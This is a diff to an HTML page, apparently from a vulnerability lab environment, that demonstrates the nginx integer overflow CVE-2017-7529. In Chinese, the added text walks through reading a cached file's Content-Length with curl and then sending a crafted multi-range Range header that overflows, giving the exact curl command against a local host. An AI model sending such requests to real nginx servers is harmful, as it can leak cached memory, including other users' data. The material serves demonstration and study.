@@ -5,8 +5,39 @@
     <title>CVE-2017-7529 Demo</title>
 </head>
 <body>
-    <h1>CVE-2017-7529 Demo</h1>
+    <h1>Nginx整数溢出漏洞 CVE-2017-7529 Demo</h1>
     <hr>
-    <img src="/proxy/demo.png" />
+    <img src="./demo.png" />
+
+<hr>
+
+<pre>
+
+1. 访问缓存文件拿到 Content-Length，以 /proxy/demo.png 为例：
+
+<code >
+$ curl -I http://127.0.0.1:8000/proxy/demo.png
+
+HTTP/1.1 200 OK
+Server: nginx/1.13.1
+Date: Wed, 12 Jul 2017 15:57:57 GMT
+Content-Type: image/png
+Content-Length: 16585
+Connection: keep-alive
+Last-Modified: Wed, 12 Jul 2017 15:57:57 GMT
+ETag: W/"40c9-5543e4fad0d40"
+X-Proxy-Cache:: MISS
+Accept-Ranges: bytes
+</code>
+
+看到 <b>Content-Length: 16585</b>, 找个比这个数大的值，例如 17208, 第二个 range 值为 0x8000000000000000-17208, 也就是 <b>9223372036854758600</b>
+
+2. 请求时设置 range 如下：
+
+<code>
+$ curl -i http://127.0.0.1:8000/proxy/demo.png -r -17208,-9223372036854758600
+</code>
+</pre>
+
 </body>
 </html>
